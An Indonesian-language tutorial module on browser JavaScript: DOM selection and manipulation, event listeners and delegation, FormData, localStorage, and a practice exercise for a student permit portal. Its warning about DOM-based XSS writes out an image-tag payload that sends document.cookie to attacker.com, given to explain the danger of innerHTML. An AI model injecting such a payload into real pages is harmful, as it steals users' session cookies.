## Daftar Isi

- [JavaScript di Browser vs di Backend (Node.js)](#javascript-di-browser-vs-di-backend-nodejs)
- [Memahami DOM sebagai In-Memory Object Tree](#memahami-dom-sebagai-in-memory-object-tree)
  - [Objek Global `window` dan `document`](#objek-global-window-dan-document)
  - [Menyeleksi Elemen DOM (`querySelector` & `querySelectorAll`)](#menyeleksi-elemen-dom-queryselector--queryselectorall)
- [Manipulasi Elemen DOM](#manipulasi-elemen-dom)
  - [Mengubah Teks dan Konten (`textContent` vs `innerHTML` & Bahaya XSS)](#mengubah-teks-dan-konten-textcontent-vs-innerhtml--bahaya-xss)
  - [Mengubah Class CSS (`classList`)](#mengubah-class-css-classlist)
  - [Membaca dan Mengubah Atribut & Dataset (`data-*`)](#membaca-dan-mengubah-atribut--dataset-data-)
  - [Membuat dan Menghapus Elemen Secara Dinamis](#membuat-dan-menghapus-elemen-secara-dinamis)
- [Arsitektur Event-Driven di Frontend](#arsitektur-event-driven-di-frontend)
  - [Konsep Event Listener (`addEventListener`)](#konsep-event-listener-addeventlistener)
  - [Menangani Form Submit & `event.preventDefault()`](#menangani-form-submit--eventpreventdefault)
  - [Event Bubbling dan Teknik Event Delegation](#event-bubbling-dan-teknik-event-delegation)
- [State Sederhana & Client-Side Storage](#state-sederhana--client-side-storage)
  - [Pola Dasar: *State → Render → Event → Update State*](#pola-dasar-state--render--event--update-state)
  - [Menyimpan Data di Browser (`localStorage` vs `sessionStorage`)](#menyimpan-data-di-browser-localstorage-vs-sessionstorage)
- [Latihan Praktikum Modul 2](#latihan-praktikum-modul-2)

# JavaScript DOM, Event Loop, dan Interaktivitas UI

## JavaScript di Browser vs di Backend (Node.js)

Jika kamu pernah menggunakan **Node.js** di sisi backend, sintaks dasar bahasa JavaScript yang digunakan di browser adalah sama (`const`, `let`, *Arrow Functions*, *Destructuring*, `Array.map()`, `Array.filter()`, `Promise`).

Namun, **API lingkungan (*Host Environment APIs*)** yang tersedia sangat berbeda:

| Fitur / Kapabilitas | Backend (Node.js / Server) | Frontend (Browser Runtime) |
| :--- | :--- | :--- |
| **Objek Global** | `global`, `process` | `window`, `document`, `navigator`, `location` |
| **Akses File Sistem** | Bisa baca/tulis langsung (`fs.readFile`) | **Dilarang keras** demi keamanan sandbox! Hanya bisa baca file yang dipilih user lewat `<input type="file">`. |
| **Koneksi Database** | Koneksi TCP langsung ke PostgreSQL/MySQL/Redis | **Tidak bisa!** Harus lewat HTTP/WebSocket ke API Backend. |
| **Manipulasi Tampilan** | Tidak ada layar (hanya `stdout` terminal) | Memiliki **DOM API** untuk mengubah elemen HTML/CSS secara langsung di layar user. |

---

## Memahami DOM sebagai In-Memory Object Tree

### Objek Global `window` dan `document`

Ketika sebuah halaman web dibuka, browser menyediakan objek induk bernama **`window`** (merepresentasikan tab browser) dan **`document`** (merepresentasikan pohon DOM dari file HTML yang sedang dimuat).

### Menyeleksi Elemen DOM (`querySelector` & `querySelectorAll`)

Sebelum bisa memanipulasi sebuah elemen HTML (mengubah teksnya, mengambil nilai inputnya, atau mendengarkan klik), kita harus mengambil referensi objeknya terlebih dahulu dari pohon DOM.

Di JavaScript modern, kamu cukup menguasai **dua fungsi utama** yang menggunakan sintaks selector CSS yang sama persis dengan Modul 1:

1. **`document.querySelector("selector")`**: Mengembalikan **satu elemen pertama** yang cocok (atau `null` jika tidak ditemukan).
2. **`document.querySelectorAll("selector")`**: Mengembalikan **`NodeList`** (mirip Array) berisi seluruh elemen yang cocok.

```javascript
// 1. Seleksi berdasarkan ID (#)
const formIzin = document.querySelector("#form-izin");
const inputNrp = document.querySelector("#input-nrp");

// 2. Seleksi berdasarkan Class (.)
const tombolSubmit = document.querySelector(".btn-submit");

// 3. Seleksi banyak elemen sekaligus
const semuaBarisTabel = document.querySelectorAll("tbody tr");
semuaBarisTabel.forEach((baris, index) => {
    console.log(`Baris ke-${index + 1}:`, baris.dataset.izinId);
});
```

---

## Manipulasi Elemen DOM

### Mengubah Teks dan Konten (`textContent` vs `innerHTML` & Bahaya XSS)

Ada dua properti utama untuk mengubah isi sebuah elemen DOM:

1. **`element.textContent`** *(Direkomendasikan & Aman)*:
   Mengubah isi teks murni. Semua karakter seperti `<script>` akan di-escape otomatis sebagai teks biasa.
2. **`element.innerHTML`** *(Gunakan dengan Hati-hati!)*:
   Mem-parsing string sebagai kode HTML baru.

> **Peringatan Keamanan untuk Backend Dev (DOM-based XSS):**
> Jangan pernah memasukkan input mentah dari user ke dalam `innerHTML`!
> Jika user menginput nama: `<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">` lalu kamu menampilkannya dengan `el.innerHTML = inputUser`, maka script jahat tersebut akan dieksekusi di browser! Selalu gunakan **`textContent`** untuk menampilkan data yang berasal dari user.

```javascript
const judulStatus = document.querySelector("#judul-status");

// ✅ AMAN: Mengubah teks dengan textContent
judulStatus.textContent = "Pengajuan Izin Berhasil Disimpan!";
```

### Mengubah Class CSS (`classList`)

Jangan mengubah banyak style satu per satu melalui `element.style.backgroundColor = "..."` di JavaScript, karena itu akan mengotori HTML dengan *inline style* yang sulit dikelola.

Sebaliknya, **definisikan tampilannya di file CSS menggunakan Class**, lalu gunakan JavaScript hanya untuk **menambah, menghapus, atau mengganti class tersebut** lewat `element.classList`:

```css
/* Di dalam style.css */
.badge {
    padding: 4px 10px;
    border-radius: 999px;
    font-size: 0.875rem;
}
.badge-pending {
    background-color: #fef3c7;
    color: #92400e;
}
.badge-approved {
    background-color: #dcfce7;
    color: #166534;
}
.hidden {
    display: none;
}
```

```javascript
/* Di dalam app.js */
const badgeStatus = document.querySelector("#badge-status");
const modalPopup = document.querySelector("#modal-konfirmasi");

// Mengganti class dari pending menjadi approved
badgeStatus.classList.remove("badge-pending");
badgeStatus.classList.add("badge-approved");
badgeStatus.textContent = "Disetujui";

// Toggle: Jika class 'hidden' ada maka dihapus, jika belum ada maka ditambahkan
modalPopup.classList.toggle("hidden");

// Mengecek apakah sebuah elemen memiliki class tertentu (return boolean)
if (modalPopup.classList.contains("hidden")) {
    console.log("Modal sedang tertutup");
}
```

### Membaca dan Mengubah Atribut & Dataset (`data-*`)

Ingat atribut `data-*` dari Modul 0? Di JavaScript, semua atribut yang diawali `data-` otomatis dikumpulkan ke dalam objek **`element.dataset`** dengan konversi nama dari `kebab-case` menjadi `camelCase`:

```html
<button id="btn-aksi" data-izin-id="1042" data-status-awal="pending">
    Proses Izin
</button>
```

```javascript
const btnAksi = document.querySelector("#btn-aksi");

// Membaca data-izin-id dan data-status-awal
console.log(btnAksi.dataset.izinId);     // Output: "1042"
console.log(btnAksi.dataset.statusAwal); // Output: "pending"

// Mengubah atribut standar (misal menonaktifkan tombol saat loading)
btnAksi.disabled = true;
btnAksi.textContent = "Memproses...";
```

### Membuat dan Menghapus Elemen Secara Dinamis

Ketika kita menerima array data baru (misalnya dari input form atau response JSON dari backend), kita dapat membuat node DOM baru dan menyisipkannya ke dalam halaman:

```javascript
const tbodyRiwayat = document.querySelector("#tabel-riwayat tbody");

function tambahBarisTabel(item) {
    // 1. Buat elemen <tr> di memori
    const tr = document.createElement("tr");
    tr.dataset.id = item.id;

    // 2. Buat sel-sel <td> dengan aman
    const tdNrp = document.createElement("td");
    tdNrp.textContent = item.nrp;

    const tdNama = document.createElement("td");
    tdNama.textContent = item.nama;

    const tdKompetisi = document.createElement("td");
    tdKompetisi.textContent = item.kompetisi;

    const tdAksi = document.createElement("td");
    const btnHapus = document.createElement("button");
    btnHapus.textContent = "Hapus";
    btnHapus.className = "btn-hapus";
    btnHapus.dataset.id = item.id;
    tdAksi.appendChild(btnHapus);

    // 3. Masukkan <td> ke dalam <tr>, lalu masukkan <tr> ke dalam <tbody>
    tr.append(tdNrp, tdNama, tdKompetisi, tdAksi);
    tbodyRiwayat.appendChild(tr);
}
```

Untuk menghapus sebuah elemen dari DOM, cukup panggil metode **`.remove()`** pada elemen tersebut:
```javascript
const barisYangMauDihapus = document.querySelector('tr[data-id="1042"]');
barisYangMauDihapus.remove();
```

---

## Arsitektur Event-Driven di Frontend

### Konsep Event Listener (`addEventListener`)

Dalam pemrograman *Event-Driven*, kita mendaftarkan sebuah fungsi *callback* (*Event Handler*) yang akan dipanggil oleh browser setiap kali suatu peristiwa terjadi pada elemen tertentu.

Sintaks:
```javascript
element.addEventListener("<nama_event>", (event) => {
    // Kode yang dijalankan ketika event terjadi
});
```

Daftar *event* yang paling sering digunakan:
- **`click`**: Saat elemen diklik (atau ditekan `Enter`/`Space` pada tombol).
- **`submit`**: Saat sebuah `<form>` dikirim (baik lewat klik tombol submit maupun tekan `Enter` di dalam input). **Selalu pasang listener `submit` pada elemen `<form>`, bukan `click` pada tombol submitnya!**
- **`input`**: Terpicu seketika setiap kali karakter di dalam `<input>` atau `<textarea>` berubah (cocok untuk *live search* atau validasi *real-time*).
- **`change`**: Terpicu saat pilihan `<select>`, `<input type="checkbox">`, atau `<input type="file">` berubah.
- **`keydown` / `keyup`**: Saat tombol keyboard ditekan (misalnya mendeteksi tombol `Escape` untuk menutup modal).

### Menangani Form Submit & `event.preventDefault()`

Secara bawaan, ketika sebuah `<form>` di-submit, browser akan melakukan **Full Page Reload** untuk mengirim data ke URL di atribut `action`.
Pada aplikasi web modern, kita tidak ingin halaman me-refresh diri, melainkan ingin mengambil datanya lewat JavaScript dan mengirimkannya secara asinkron di latar belakang.

Untuk mencegah perilaku *reload* bawaan browser tersebut, kita memanggil **`event.preventDefault()`**, lalu mengekstrak seluruh nilai form secara instan menggunakan objek **`FormData`**:

```javascript
const formIzin = document.querySelector("#form-izin");

formIzin.addEventListener("submit", (event) => {
    // 1. WAJIB: Cegah browser melakukan refresh halaman!
    event.preventDefault();

    // 2. Ekstrak semua input yang punya atribut 'name' menggunakan FormData
    const formData = new FormData(formIzin);

    // 3. Konversi menjadi objek JavaScript biasa (key-value JSON)
    const payload = Object.fromEntries(formData.entries());
    console.log("Payload siap dikirim ke Backend:", payload);

    // Contoh output payload:
    // { nrp: "5027261053", nama: "Mikail", kategori: "lomba", tanggal_mulai: "2026-11-26" }

    // 4. Reset isi form setelah berhasil diproses
    formIzin.reset();
});
```

> **Trik Efisiensi `Object.fromEntries(new FormData(form))`:**
> Daripada menulis `document.querySelector("#input-1").value`, `document.querySelector("#input-2").value` satu per satu untuk 10 input, cukup pastikan semua `<input>` memiliki atribut `name="..."` yang sesuai dengan *schema* backend-mu, lalu gunakan `Object.fromEntries(new FormData(form))`! Dalam 1 baris, seluruh input form langsung berubah menjadi objek JSON yang rapi.

### Event Bubbling dan Teknik Event Delegation

Bayangkan kamu memiliki tabel dengan **100 baris data**, dan di setiap baris ada tombol **"Hapus"**. Selain itu, baris baru bisa ditambahkan sewaktu-waktu tanpa *refresh* halaman.
Jika kamu memasang `addEventListener("click", ...)` pada masing-masing tombol satu per satu:
1. Akan ada 100 *event listener* di memori.
2. Tombol baru yang ditambahkan belakangan lewat JavaScript tidak akan punya *listener* jika kamu lupa mendaftarkannya lagi!

**Solusinya adalah memahami Event Bubbling & Event Delegation:**
Di DOM, ketika kamu mengklik sebuah `<button>` di dalam `<td>`, di dalam `<tr>`, di dalam `<tbody>`, event klik tersebut sebenarnya **merambat naik ke atas (*Bubbling*)** seperti gelembung air:
`button` ──► `td` ──► `tr` ──► `tbody` ──► `table` ──► `body` ──► `document`.

Karena event klik pasti melewati `<tbody>`, kita cukup memasang **SATU `addEventListener` saja pada `<tbody>` induknya**, lalu memeriksa elemen mana yang sebenarnya diklik melalui **`event.target`**:

```javascript
const tbodyRiwayat = document.querySelector("#tabel-riwayat tbody");

// Cukup 1 listener pada induk <tbody> untuk menangani ribuan baris sekarang maupun masa depan!
tbodyRiwayat.addEventListener("click", (event) => {
    // Cek apakah elemen yang diklik adalah tombol hapus
    const tombolHapus = event.target.closest(".btn-hapus");
    if (!tombolHapus) return; // Abaikan jika user mengklik bagian lain

    const idIzin = tombolHapus.dataset.id;
    console.log("Menghapus pengajuan izin dengan ID:", idIzin);

    // Cari elemen <tr> terdekat dari tombol tersebut lalu hapus dari DOM
    const barisTr = tombolHapus.closest("tr");
    barisTr.remove();
});
```

---

## State Sederhana & Client-Side Storage

### Pola Dasar: *State → Render → Event → Update State*

Agar kode JavaScript tidak berubah menjadi *spaghetti code* (di mana data tersebar di dalam teks HTML), biasakan memisahkan **Data (State)** dari **Tampilan (DOM)** sejak menggunakan Vanilla JS. Ini adalah fondasi utama sebelum nantinya masuk ke React di Modul 5!

### Menyimpan Data di Browser (`localStorage` vs `sessionStorage`)

Browser menyediakan penyimpanan *Key-Value* lokal (mirip Redis mini di dalam browser klien, dengan kapasitas sekitar 5 MB per domain):

- **`localStorage`**: Data tetap tersimpan permanen di browser meskipun tab ditutup atau komputer di-restart (sampai dihapus oleh kode atau user melakukan *Clear Browser Data*).
- **`sessionStorage`**: Data hanya bertahan selama tab tersebut terbuka. Begitu tab ditutup, datanya hilang.

Karena `localStorage` hanya bisa menyimpan **String**, kita selalu menggunakan **`JSON.stringify()`** saat menyimpan objek/array, dan **`JSON.parse()`** saat membacanya kembali:

```javascript
const STORAGE_KEY = "DATA_IZIN_KOMPE";

// 1. Membaca State dari localStorage saat halaman pertama kali dibuka
let daftarIzin = JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];

// 2. Fungsi untuk menyimpan State ke localStorage
function simpanKeStorage() {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(daftarIzin));
}

// 3. Fungsi Render: Menggambar ulang isi <tbody> berdasarkan isi array daftarIzin
function renderTabel() {
    const tbody = document.querySelector("#tabel-riwayat tbody");
    tbody.innerHTML = ""; // Kosongkan isi lama

    if (daftarIzin.length === 0) {
        const trKosong = document.createElement("tr");
        const tdKosong = document.createElement("td");
        tdKosong.colSpan = 4;
        tdKosong.textContent = "Belum ada data pengajuan izin.";
        trKosong.appendChild(tdKosong);
        tbody.appendChild(trKosong);
        return;
    }

    daftarIzin.forEach((izin) => {
        tambahBarisTabel(izin); // Gunakan fungsi pembuat elemen
    });
}
```

---

## Latihan Praktikum Modul 2

Hubungkan file `app.js` ke halaman **"Portal Pengajuan Izin Kompetisi Mahasiswa"** dari Modul 0 dan Modul 1, lalu implementasikan fitur interaktif berikut:

1. **Form Handling Tanpa Reload**: Tangkap event `submit` pada `#form-izin`, gunakan `event.preventDefault()`, ambil data menggunakan `new FormData()`, dan tambahkan objek izin baru (lengkap dengan `id: Date.now()` dan `status: "Menunggu"`) ke dalam array `daftarIzin`.
2. **Persistensi Data dengan `localStorage`**: Setiap kali ada izin baru yang ditambahkan atau dihapus, simpan array `daftarIzin` ke `localStorage` sehingga saat halaman di-refresh (`F5`), data di dalam tabel tidak hilang.
3. **Fitur Hapus & Ubah Status dengan Event Delegation**: Pasang satu *event listener* pada `<tbody>` untuk menangani tombol **"Setujui"** (mengubah status badge menjadi hijau) dan tombol **"Hapus"** (menghapus data dari array `daftarIzin`, memperbarui `localStorage`, dan memperbarui tampilan tabel).
4. **Live Filter / Pencarian**: Tambahkan sebuah `<input type="search" id="input-cari" placeholder="Cari nama atau kompetisi...">` di atas tabel yang mendengarkan event `input` untuk memfilter baris tabel secara *real-time* saat user mengetik.
